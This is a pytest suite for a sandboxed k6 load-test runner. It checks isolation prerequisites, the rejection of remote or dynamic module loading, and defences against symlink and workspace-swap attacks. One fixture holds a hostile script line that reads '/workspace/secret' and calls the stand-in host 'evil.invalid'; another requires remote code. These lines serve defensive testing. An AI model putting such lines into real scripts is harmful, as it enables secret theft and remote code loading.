import json
import os
from pathlib import Path

import pytest

from ai_qa_automation.policy import PolicyEngine
from ai_qa_automation.tools import performance
from ai_qa_automation.tools.execution_env import BoundedSubprocessResult
from ai_qa_automation.tools.performance import K6Runner


def _policy(tmp_path: Path) -> PolicyEngine:
    return PolicyEngine(tmp_path, tmp_path)


def _write_import_graph(tmp_path: Path) -> Path:
    directory = tmp_path / "performance"
    directory.mkdir()
    (directory / "helper.js").write_text(
        "export const path = '/v1';\n",
        encoding="utf-8",
    )
    (directory / "load.js").write_text(
        "import http from 'k6/http';\n"
        "import { path } from './helper.js';\n"
        "export default function () { http.get(__ENV.BASE_URL + path); }\n",
        encoding="utf-8",
    )
    return Path("performance/load.js")


def _summary() -> dict[str, object]:
    return {
        "metrics": {
            "http_req_duration": {"values": {"med": 1.0, "p(90)": 2.0, "p(95)": 3.0, "p(99)": 4.0}},
            "http_reqs": {"values": {"rate": 5.0}},
            "http_req_failed": {"values": {"rate": 0.0}},
        }
    }


def test_k6_requires_process_filesystem_isolation_before_execution(tmp_path: Path) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
    )

    with pytest.raises(PermissionError, match="process/filesystem isolation"):
        runner.run(
            script,
            target_url="http://127.0.0.1:8000",
            environment="local",
        )


@pytest.mark.parametrize("value", [1, "true", object()])
def test_k6_rejects_non_boolean_process_isolation_assertion(tmp_path: Path, value: object) -> None:
    with pytest.raises(ValueError, match="external_process_isolation_enforced"):
        K6Runner(
            tmp_path,
            _policy(tmp_path),
            external_egress_enforced=True,
            external_process_isolation_enforced=value,  # type: ignore[arg-type]
        )


@pytest.mark.parametrize("value", [1, "true", object()])
def test_k6_rejects_non_boolean_module_isolation_assertion(tmp_path: Path, value: object) -> None:
    with pytest.raises(ValueError, match="external_module_isolation_enforced"):
        K6Runner(
            tmp_path,
            _policy(tmp_path),
            external_egress_enforced=True,
            external_module_isolation_enforced=value,  # type: ignore[arg-type]
        )


@pytest.mark.parametrize("value", [1, "true", object()])
def test_k6_rejects_non_boolean_resource_limits_assertion(tmp_path: Path, value: object) -> None:
    with pytest.raises(ValueError, match="external_resource_limits_enforced"):
        K6Runner(
            tmp_path,
            _policy(tmp_path),
            external_egress_enforced=True,
            external_resource_limits_enforced=value,  # type: ignore[arg-type]
        )


@pytest.mark.parametrize("value", [1, "true", object()])
def test_k6_rejects_non_boolean_workload_limits_assertion(tmp_path: Path, value: object) -> None:
    with pytest.raises(ValueError, match="external_workload_limits_enforced"):
        K6Runner(
            tmp_path,
            _policy(tmp_path),
            external_egress_enforced=True,
            external_workload_limits_enforced=value,  # type: ignore[arg-type]
        )


def test_k6_requires_module_isolation_before_binary_lookup(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
        external_process_isolation_enforced=True,
    )

    def fail_lookup(_name: str, *, env: dict[str, str]) -> str:
        del env
        raise AssertionError("k6 binary lookup occurred before module-isolation authorization")

    monkeypatch.setattr(performance, "resolve_executable", fail_lookup)
    with pytest.raises(PermissionError, match="module-loading isolation"):
        runner.run(
            script,
            target_url="http://127.0.0.1:8000",
            environment="local",
        )


def test_k6_requires_resource_limits_before_binary_lookup(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
        external_process_isolation_enforced=True,
        external_module_isolation_enforced=True,
    )

    def fail_lookup(_name: str, *, env: dict[str, str]) -> str:
        del env
        raise AssertionError("k6 binary lookup occurred before resource-limit authorization")

    monkeypatch.setattr(performance, "resolve_executable", fail_lookup)
    with pytest.raises(PermissionError, match="CPU/memory/process resource limits"):
        runner.run(
            script,
            target_url="http://127.0.0.1:8000",
            environment="local",
        )


def test_k6_requires_workload_limits_before_binary_lookup(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
        external_process_isolation_enforced=True,
        external_module_isolation_enforced=True,
        external_resource_limits_enforced=True,
    )

    def fail_lookup(_name: str, *, env: dict[str, str]) -> str:
        del env
        raise AssertionError("k6 binary lookup occurred before workload-limit authorization")

    monkeypatch.setattr(performance, "resolve_executable", fail_lookup)
    with pytest.raises(PermissionError, match="target workload limits"):
        runner.run(
            script,
            target_url="http://127.0.0.1:8000",
            environment="local",
        )


def test_k6_rejects_target_host_remote_commonjs_require(tmp_path: Path) -> None:
    directory = tmp_path / "performance"
    directory.mkdir()
    (directory / "load.js").write_text(
        "import http from 'k6/http';\n"
        "const module = require('http://127.0.0.1:8000/target-controlled.js');\n"
        "export default function () { module.run(); http.get(__ENV.BASE_URL + '/v1'); }\n",
        encoding="utf-8",
    )
    runner = K6Runner(tmp_path, _policy(tmp_path), external_egress_enforced=True)

    with pytest.raises(PermissionError, match="CommonJS require"):
        runner._validate_script(Path("performance/load.js"), "http://127.0.0.1:8000")


def test_k6_rejects_aliased_commonjs_require(tmp_path: Path) -> None:
    directory = tmp_path / "performance"
    directory.mkdir()
    (directory / "load.js").write_text(
        "import http from 'k6/http';\n"
        "const loader = require; loader(__ENV.BASE_URL + '/target-controlled.js');\n"
        "export default function () { http.get(__ENV.BASE_URL + '/v1'); }\n",
        encoding="utf-8",
    )
    runner = K6Runner(tmp_path, _policy(tmp_path), external_egress_enforced=True)

    with pytest.raises(PermissionError, match="CommonJS require"):
        runner._validate_script(Path("performance/load.js"), "http://127.0.0.1:8000")


def test_k6_rejects_dynamic_import(tmp_path: Path) -> None:
    directory = tmp_path / "performance"
    directory.mkdir()
    (directory / "load.js").write_text(
        "import http from 'k6/http';\n"
        "const modulePromise = import('./helper.js');\n"
        "export default function () { http.get(__ENV.BASE_URL + '/v1'); }\n",
        encoding="utf-8",
    )
    runner = K6Runner(tmp_path, _policy(tmp_path), external_egress_enforced=True)

    with pytest.raises(PermissionError, match=r"dynamic import\(\)"):
        runner._validate_script(Path("performance/load.js"), "http://127.0.0.1:8000")


def test_k6_executes_validated_snapshot_after_workspace_mutation(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
        external_process_isolation_enforced=True,
        external_module_isolation_enforced=True,
        external_resource_limits_enforced=True,
        external_workload_limits_enforced=True,
    )

    original_write = runner._write_validated_snapshot

    def mutate_then_write(snapshot_root: Path, modules: dict[Path, str]) -> None:
        (tmp_path / "performance/load.js").write_text(
            "import http from 'k6/http'; open('/workspace/secret'); "
            "http.get('https://evil.invalid');\n",
            encoding="utf-8",
        )
        (tmp_path / "performance/helper.js").write_text(
            "export const path = '/evil';\n",
            encoding="utf-8",
        )
        original_write(snapshot_root, modules)

    monkeypatch.setattr(runner, "_write_validated_snapshot", mutate_then_write)
    observed: dict[str, object] = {}

    def fake_resolve(name: str, *, env: dict[str, str]) -> str:
        assert name == "k6"
        assert str(tmp_path) not in env["PATH"].split(os.pathsep)
        assert "VIRTUAL_ENV" not in env
        observed["resolved_path"] = env["PATH"]
        return "/usr/bin/k6"

    def fake_run(
        command: list[str],
        *,
        cwd: Path,
        env: dict[str, str],
        timeout_seconds: int,
    ) -> BoundedSubprocessResult:
        del timeout_seconds
        observed["cwd"] = cwd
        assert command[0] == "/usr/bin/k6"
        assert env["K6_AUTO_EXTENSION_RESOLUTION"] == "false"
        snapshot_script = Path(command[-1])
        assert snapshot_script.read_text(encoding="utf-8").endswith(
            "export default function () { http.get(__ENV.BASE_URL + path); }\n"
        )
        assert (snapshot_script.parent / "helper.js").read_text(encoding="utf-8") == (
            "export const path = '/v1';\n"
        )
        summary_path = Path(command[command.index("--summary-export") + 1])
        summary_path.write_text(json.dumps(_summary()), encoding="utf-8")
        return BoundedSubprocessResult(
            returncode=0,
            stdout="",
            stderr="",
            stdout_truncated=False,
            stderr_truncated=False,
            timed_out=False,
        )

    monkeypatch.setattr(performance, "resolve_executable", fake_resolve)
    monkeypatch.setattr(performance, "run_bounded_subprocess", fake_run)

    metrics = runner.run(
        script,
        target_url="http://127.0.0.1:8000",
        environment="local",
    )

    assert metrics.p95_ms == 3.0
    assert observed["resolved_path"]
    assert observed["cwd"] != tmp_path
    assert str(observed["cwd"]).endswith("/workspace")


def test_k6_rejects_symlinked_root_script(tmp_path: Path) -> None:
    script = _write_import_graph(tmp_path)
    target = tmp_path / script
    link = target.with_name("linked.js")
    try:
        link.symlink_to(target)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable on this platform")
    runner = K6Runner(tmp_path, _policy(tmp_path), external_egress_enforced=True)

    with pytest.raises(PermissionError, match="confined no-follow ingestion"):
        runner._validate_script(link.relative_to(tmp_path), "http://127.0.0.1:8000")


def test_k6_rejects_symlinked_local_import(tmp_path: Path) -> None:
    directory = tmp_path / "performance"
    directory.mkdir()
    target = directory / "real-helper.js"
    target.write_text("export const path = '/v1';\n", encoding="utf-8")
    link = directory / "helper.js"
    try:
        link.symlink_to(target)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable on this platform")
    (directory / "load.js").write_text(
        "import http from 'k6/http';\n"
        "import { path } from './helper.js';\n"
        "export default function () { http.get(__ENV.BASE_URL + '/v1'); }\n",
        encoding="utf-8",
    )
    runner = K6Runner(tmp_path, _policy(tmp_path), external_egress_enforced=True)

    with pytest.raises(PermissionError, match="confined no-follow ingestion"):
        runner._validate_script(Path("performance/load.js"), "http://127.0.0.1:8000")


def test_k6_rejects_workspace_root_replacement_after_runner_construction(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    script = _write_import_graph(workspace)
    runner = K6Runner(
        workspace,
        PolicyEngine(tmp_path / "control", workspace),
        external_egress_enforced=True,
    )
    workspace.rename(tmp_path / "original-workspace")
    workspace.mkdir()
    _write_import_graph(workspace)

    with pytest.raises(PermissionError, match="confined no-follow ingestion"):
        runner._validate_script(script, "http://127.0.0.1:8000")


def test_k6_rejects_parent_symlink_swap_during_import_collection(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(tmp_path, _policy(tmp_path), external_egress_enforced=True)
    original_read = performance.read_bytes_confined
    swapped = False

    def swap_parent_then_read(
        root: Path,
        relative_path: str | Path,
        *,
        max_bytes: int,
        label: str,
        expected_root_identity: tuple[int, int] | None = None,
    ) -> bytes:
        nonlocal swapped
        relative = Path(relative_path)
        if relative == Path("performance/helper.js") and not swapped:
            swapped = True
            original_directory = tmp_path / "performance"
            original_directory.rename(tmp_path / "original-performance")
            outside = tmp_path / "outside"
            outside.mkdir()
            (outside / "helper.js").write_text(
                "export const path = '/outside';\n",
                encoding="utf-8",
            )
            try:
                original_directory.symlink_to(outside, target_is_directory=True)
            except (OSError, NotImplementedError):
                pytest.skip("symlinks unavailable on this platform")
        return original_read(
            root,
            relative,
            max_bytes=max_bytes,
            label=label,
            expected_root_identity=expected_root_identity,
        )

    monkeypatch.setattr(performance, "read_bytes_confined", swap_parent_then_read)

    with pytest.raises(PermissionError, match="confined no-follow ingestion"):
        runner._validate_script(script, "http://127.0.0.1:8000")
    assert swapped is True
